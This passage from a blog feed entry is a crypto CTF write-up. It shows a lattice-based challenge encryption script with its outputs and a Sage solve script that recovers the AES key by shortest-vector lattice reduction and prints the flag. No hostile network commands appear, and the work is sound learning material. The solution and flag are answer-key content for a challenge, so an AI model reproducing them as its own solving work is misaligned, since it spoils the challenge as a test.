builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    m <span class="token operator">=</span> matrix<span class="token punctuation">(</span>M<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    W <span class="token operator">=</span> get_public_key<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    r <span class="token operator">=</span> get_random_r<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    e <span class="token operator">=</span> m<span class="token operator">*</span>W<span class="token operator">+</span>r</pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e ="</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"W ="</span><span class="token punctuation">,</span>W<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">return</span> M</pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token keyword">def</span> <span class="token function">new_encrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    M <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    key <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    c <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c ="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>new_encrypt<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token comment">#e = [151991736758354 115130361237591  58905390613532 130965235357066  74614897867998  48099459442369  45894485782943   7933340009592     25794185638]</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token comment">#W = [-10150241248 -11679953514  -8802490385 -12260198788 -10290571893   -334269043 -11669932300  -2158827458     -7021995]</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token comment">#[ 52255960212  48054224859  28230779201  43264260760  20836572799   8191198018  14000400181   4370731005     14251110]</span></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token comment">#[  2274129180  -1678741826  -1009050115   1858488045    978763435   4717368685   -561197285  -1999440633     -6540190]</span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token comment">#[ 45454841384  34351838833  19058600591  39744104894  21481706222  14785555279  13193105539   2306952916      7501297]</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token comment">#[-16804706629 -13041485360  -8292982763 -16801260566  -9211427035  -4808377155  -6530124040  -2572433293     -8393737]</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token comment">#[ 28223439540  19293284310   5217202426  27179839904  23182044384  10788207024  18495479452   4007452688     13046387]</span></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token comment">#[   968256091  -1507028552   1677187853   8685590653   9696793863   2942265602  10534454095   2668834317      8694828]</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token comment">#[ 33556338459  26577210571  16558795385  28327066095  10684900266   9113388576   2446282316   -173705548      -577070]</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token comment">#[ 35404775180  32321129676  15071970630  24947264815  14402999486   5857384379  10620159241   2408185012      7841686]</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token comment">#c =1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9oeHAuaW8vYmxvZy8yNi9Wb2xnYUNURi0yMDE2LVF1YWxzLWNyeXB0bzMwMC1YWFktd3JpdGV1cC8=">谷歌上搜到个原题</span></p>
<p><strong>exp.sage:</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> sage<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>free_module_integer <span class="token keyword">import</span> IntegerLattice</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="5"></td><td><pre>w <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'[-10150241248 -11679953514  -8802490385 -12260198788 -10290571893   -334269043 -11669932300  -2158827458     -7021995]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token string">'[ 52255960212  48054224859  28230779201  43264260760  20836572799   8191198018  14000400181   4370731005     14251110]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>         <span class="token string">'[  2274129180  -1678741826  -1009050115   1858488045    978763435   4717368685   -561197285  -1999440633     -6540190]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>         <span class="token string">'[ 45454841384  34351838833  19058600591  39744104894  21481706222  14785555279  13193105539   2306952916      7501297]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>         <span class="token string">'[-16804706629 -13041485360  -8292982763 -16801260566  -9211427035  -4808377155  -6530124040  -2572433293     -8393737]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>         <span class="token string">'[ 28223439540  19293284310   5217202426  27179839904  23182044384  10788207024  18495479452   4007452688     13046387]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>         <span class="token string">'[   968256091  -1507028552   1677187853   8685590653   9696793863   2942265602  10534454095   2668834317      8694828]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>         <span class="token string">'[ 33556338459  26577210571  16558795385  28327066095  10684900266   9113388576   2446282316   -173705548      -577070]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>         <span class="token string">'[ 35404775180  32321129676  15071970630  24947264815  14402999486   5857384379  10620159241   2408185012      7841686]'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    W<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> w<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        temp<span class="token operator">=</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        temp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> temp<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        W<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        </pre></td></tr><tr><td data-num="20"></td><td><pre>W<span class="token operator">=</span>matrix<span class="token punctuation">(</span>W<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>e<span class="token operator">=</span><span class="token string">'[151991736758354 115130361237591  58905390613532 130965235357066  74614897867998  48099459442369  45894485782943   7933340009592     25794185638]'</span></pre></td></tr><tr><td data-num="22"></td><td><pre>E<span class="token operator">=</span>e<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>e<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> E<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>e<span class="token operator">=</span>matrix<span class="token punctuation">(</span>e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>B <span class="token operator">=</span> W<span class="token punctuation">.</span>stack<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>augment<span class="token punctuation">(</span>vector<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> W<span class="token punctuation">.</span>ncols<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>d <span class="token operator">=</span> IntegerLattice<span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">.</span>shortest_vector<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'d = &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>d<span class="token operator">=</span>vector<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>xxx<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">151991736758357</span><span class="token punctuation">,</span> <span class="token number">115130361237593</span><span class="token punctuation">,</span> <span class="token number">58905390613535</span><span class="token punctuation">,</span> <span class="token number">130965235357066</span><span class="token punctuation">,</span> <span class="token number">74614897868001</span><span class="token punctuation">,</span> <span class="token number">48099459442367</span><span class="token punctuation">,</span> <span class="token number">45894485782941</span><span class="token punctuation">,</span> <span class="token number">7933340009592</span><span class="token punctuation">,</span> <span class="token number">25794185636</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="32"></td><td><pre>m <span class="token operator">=</span> W<span class="token punctuation">.</span>solve_left<span class="token punctuation">(</span>vector<span class="token punctuation">(</span>xxx<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'m = &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>M<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">877</span><span class="token punctuation">,</span> <span class="token number">619</span><span class="token punctuation">,</span> <span class="token number">919</span><span class="token punctuation">,</span> <span class="token number">977</span><span class="token punctuation">,</span> <span class="token number">541</span><span class="token punctuation">,</span> <span class="token number">941</span><span class="token punctuation">,</span> <span class="token number">947</span><span class="token punctuation">,</span> <span class="token number">1031</span><span class="token punctuation">,</span> <span class="token number">821</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="35"></td><td><pre>key <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>c<span class="token operator">=</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token string">'1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token comment">#flag&#123;be5152d04a49234a251956a32b&#125;</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
